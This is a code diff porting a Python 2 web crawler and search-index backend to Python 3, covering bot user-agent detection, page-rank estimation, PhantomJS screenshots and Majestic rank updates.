-    if u'AHC/' in text:
+    if 'AHC/' in text:
         return True
     # looksystems.net
-    if u'looksystems.net' in text:
+    if 'looksystems.net' in text:
         return True
     # crawler4j (http://code.google.com/p/crawler4j/)
-    if u'crawler4j' in text:
+    if 'crawler4j' in text:
         return True
     # VerticalLeap-BacklinkChecker
-    if u'VerticalLeap-BacklinkChecker' in text:
+    if 'VerticalLeap-BacklinkChecker' in text:
         return True
     # Barkrowler/0.7 (+http://www.exensa.com/crawl)
-    if u'Barkrowler/' in text:
+    if 'Barkrowler/' in text:
         return True
     # MBCrawler/1.0 (https://monitorbacklinks.com)
-    if u'MBCrawler/' in text:
+    if 'MBCrawler/' in text:
         return True
     # http_requester/0.1
-    if u'http_requester/' in text:
+    if 'http_requester/' in text:
         return True
     # YOURLS v1.7 +http://yourls.org/ (running on http://10.25.207.66)
-    if u'YOURLS v' in text:
+    if 'YOURLS v' in text:
         return True
     # Mozilla/5.0 (compatible; Wappalyzer; https://www.wappalyzer.com)
-    if u'Wappalyzer;' in text:
+    if 'Wappalyzer;' in text:
         return True
     # MauiBot (crawler.feedback+wc@gmail.com)
-    if u'MauiBot' in text:
+    if 'MauiBot' in text:
         return True
     # Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko Kazehakase/0.5.4 Debian/0.5.4-2.1ubuntu3
-    if u'Kazehakase' in text:
+    if 'Kazehakase' in text:
         return True
     # Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)
     # No current user is on any Mozilla/4.0 browser. This is only used by bots at this point.
-    if u'Mozilla/4.0' in text:
+    if 'Mozilla/4.0' in text:
         return True
     # SEMrushBot
-    if u'SEMrushBot' in text:
+    if 'SEMrushBot' in text:
         return True
     # Mozilla/5.0 (compatible; SemrushBot-BA; +http://www.semrush.com/bot.html)
-    if u'SemrushBot' in text:
+    if 'SemrushBot' in text:
         return True
     # Ancient versions of browsers are commonly used by bots, but pretty much never by Humans.
     # Examples:
     # Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6
     # Firefox/3.0.6
-    if u'Firefox/2.0.0.6' in text or 'Firefox/3.0.6' in text:
+    if 'Firefox/2.0.0.6' in text or 'Firefox/3.0.6' in text:
         return True
     return False
 
@@ -3362,22 +3360,22 @@ def CalculatePageRankForExistingTerm(siteinfo, keywords, lang='en', verbose=Fals
         index_lang = GetIndexModelFromLanguage(lang)
         existing = index_lang.objects.get(keywords=keywords)
     except ObjectDoesNotExist:
-        raise ValueError(u"Keywords '{0}' not found.".format(keywords))
+        raise ValueError("Keywords '{0}' not found.".format(keywords))
     result = CalculateTermValue(siteinfo, keywords, lang=lang, verbose=False)
     if verbose:
-        print u'Term {0} value for {1} is {2}'.format(keywords, siteinfo.url, result)
+        print('Term {0} value for {1} is {2}'.format(keywords, siteinfo.url, result))
         reasons = CalculateTermValue(siteinfo, keywords, lang=lang, verbose=True)
-        print u'Term {0} reasons for {1} is {2}'.format(keywords, siteinfo.url, reasons)
+        print('Term {0} reasons for {1} is {2}'.format(keywords, siteinfo.url, reasons))
     search_results = ujson.loads(existing.search_results)
     rank = 0
     for idx, item in enumerate(search_results):
         if verbose and idx == 0:
-            print u'Index {0} score is {1}'.format(idx, item[1]['score'])
+            print('Index {0} score is {1}'.format(idx, item[1]['score']))
         if item[1]['score'] < result:
             rank = idx
             break
     if verbose:
-        print u'Page {0} would rank {1} for {2}'.format(siteinfo.url, rank, keywords)
+        print('Page {0} would rank {1} for {2}'.format(siteinfo.url, rank, keywords))
     return rank
 
 def SplitTitleAndGetPageRanks(siteinfo, minlength=3):
@@ -3398,17 +3396,17 @@ def SplitTitleAndGetPageRanks(siteinfo, minlength=3):
             continue
         try:
             place = CalculatePageRankForExistingTerm(siteinfo, term, lang='en', verbose=False)
-            results.append(u'{0} = {1}'.format(term, place))
+            results.append('{0} = {1}'.format(term, place))
             if place != 0 and place <= 200:
                 need_to_index.append(term)
-        except ValueError, e:
+        except ValueError as e:
             notfound.append(term)
             try:
-                print e
+                print(e)
             except:
-                print 'ValueError - one of the words in the title was not found, but it is unprintable.'
+                print('ValueError - one of the words in the title was not found, but it is unprintable.')
     for result in results:
-        print result
+        print(result)
     return need_to_index
 
 
@@ -3426,9 +3424,9 @@ def TakeScreenshot(url):
     except:
         driver.service.process.send_signal(signal.SIGTERM)
         try:
-           driver.quit()
+            driver.quit()
         except OSError:
-           pass
+            pass
         return False
     try:
         shot = Screenshot.objects.get(domain__url=url)
@@ -3446,20 +3444,20 @@ def TakeScreenshot(url):
     except:
         driver.service.process.send_signal(signal.SIGTERM)
         try:
-           driver.quit()
+            driver.quit()
         except OSError:
-           pass
+            pass
         return False
     # Crop it back to the window size (it may be taller)
     box = (0, 0, WIDTH, HEIGHT)
     try:
-        im = Image.open(StringIO.StringIO(screen))
+        im = Image.open(io.StringIO(screen))
     except:
         driver.service.process.send_signal(signal.SIGTERM)
         try:
-           driver.quit()
+            driver.quit()
         except OSError:
-           pass
+            pass
         return False
     region = im.crop(box)
     region.save('screenshots/{0}.png'.format(url), 'PNG')
@@ -3473,10 +3471,10 @@ def TakeScreenshot(url):
     # Terminate phantomjs process. See: https://adiyatmubarak.wordpress.com/2017/03/29/python-fix-oserror-errno-9-bad-file-descriptor-in-selenium-using-phantomjs/
     driver.service.process.send_signal(signal.SIGTERM)
     try:
-       driver.quit()
+        driver.quit()
     except OSError:
-       # We can still get these errors, but at least the phantomjs process will terminate.
-       pass
+        # We can still get these errors, but at least the phantomjs process will terminate.
+        pass
     return shot
 
 def GetFavicons(domain):
@@ -3554,7 +3552,7 @@ def UpdateMajesticRank(domain_name, rank, refsubnets):
         # Consider both to be the same thing and make them match.
         try:
             if not domain.url.startswith('www.'):
-                domain = DomainInfo.objects.get(url='www.'+ domain_name)
+                domain = DomainInfo.objects.get(url='www.' + domain_name)
                 domain.majestic_rank = rank
                 domain.majestic_rank_date = datetime.date.today()
                 domain.majestic_refsubnets = refsubnets
@@ -3583,7 +3581,7 @@ def UpdateMajesticRank(domain_name, rank, refsubnets):
             # Update the www. version or non-www. version of the domain if it exists.
             try:
                 if not domain.url.startswith('www.'):
-                    domain = DomainInfo.objects.get(url='www.'+ domain_name)
+                    domain = DomainInfo.objects.get(url='www.' + domain_name)
                     domain.majestic_rank = rank
                     domain.majestic_rank_date = datetime.date.today()
                     domain.majestic_refsubnets = refsubnets
@@ -3602,7 +3600,7 @@ def UpdateMajesticRank(domain_name, rank, refsubnets):
             # to-be-crawled list so it eventually makes it into the index.
             # But only if it's not blocked.
             try:
-                blocked_domain = BlockedSite.objects.get(url=domain_name)
+                BlockedSite.objects.get(url=domain_name)
             except ObjectDoesNotExist:
                 # Exception on a get means that it wasn't found in the block list.
                 url = CrawlableUrl()
